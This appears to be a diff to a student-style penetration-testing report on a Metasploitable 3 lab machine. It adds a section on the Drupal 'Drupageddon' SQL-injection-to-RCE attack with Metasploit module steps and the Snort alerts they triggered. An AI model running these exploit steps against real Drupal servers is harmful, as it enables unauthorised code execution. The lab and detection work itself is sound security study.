@@ -25,3 +25,23 @@ This report details the penetration testing performed on the [Metasploitable 3 (
 [**] [1:100000122:1] COMMUNITY WEB-MISC mod_jrun overflow attempt [**]                                            [Classification: Web Application Attack]                 [Priority: 1] {TCP} 172.28.128.1:56642 -> 172.28.128.3:80                                                            
 [**] [1:2022028:1] ET WEB_SERVER Possible CVE-2014-6271 Attempt [**]                                              [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:56643 -> 172.28.128.3:80 
 ```
+
+
+## IDENTIFIED ATTACK 2: Drupal Drupageddon
+
+### Description
+
+**Component Targeted:** Drupal Web Application
+
+**Execution Method:** This attack exploits a remote code execution vulnerability in Drupal (versions 7.0 to 7.31), commonly referred to as "Drupageddon". The vulnerability allows an attacker to execute arbitrary PHP code on the web server by exploiting an SQL injection vulnerability in the Drupal HTTP Parameter Key/Value handling. [CVE-2014-3704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704)
+
+**Steps in Metasploit:**
+1. Select the exploit: `use exploit/multi/http/drupal_drupageddon`
+2. Set the target IP: `set RHOST <target_ip>`
+3. Set the target URI: `set TARGETURI /drupal/`
+4. Execute the attack: `run`
+
+**Snort Output:**
+```
+[**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:58460 -> 172.28.128.3:80 
+```
